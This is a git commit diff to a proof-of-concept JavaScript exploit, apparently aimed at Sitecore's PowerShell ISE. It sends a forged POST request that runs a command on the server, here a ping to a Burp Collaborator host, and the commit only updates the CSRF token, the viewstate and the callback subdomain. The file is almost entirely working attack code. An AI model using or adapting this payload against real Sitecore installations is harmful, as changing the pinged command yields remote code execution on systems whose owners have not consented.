cabca8ec058ca174cf72225413556c72bef0ff0f
portalstr <92850422+portalstr@users.noreply.github.com>
2021-11-08 21:32:28 +0200

    Update poc.js

--- poc.js
+++ poc.js
@@ -6,5 +6,5 @@ function handleResponse() {
     var changeReq = new XMLHttpRequest();
     changeReq.open('post', '/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1', true);
     changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    changeReq.send('&__PARAMETERS=ise%3Aexecute%28elevationResult%3D1%29%28elevationResult%3D1%29&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACQ3NTNlMzUzZi1jN2FjLTQxZTEtOWVjMS1mYTVkYWJjOWQ5YjkL&__VIEWSTATE=BAA9C8E1B9D847BEA06DDFD2103DF2F2&__VIEWSTATE=&scActiveRibbonStrip=&scGalleries=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%208ktoysf03uctzlqzr7y3jcnew52wxkm.burpcollaborator.net')
+    changeReq.send('&__PARAMETERS=ise%3Aexecute%28elevationResult%3D1%29%28elevationResult%3D1%29&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=&__ISEVENT=1&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACRkNDQ5M2JhMy02Njk5LTQwOGMtYjVlZC02NjAyM2IyNjZkNzAL&__VIEWSTATE=FCA1620450974477A42A3E19A85D4C09&__VIEWSTATE=&scActiveRibbonStrip=&scGalleries=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%20312jfnwvkptogg7u82fy0749d0jrff4.burpcollaborator.net')
 };
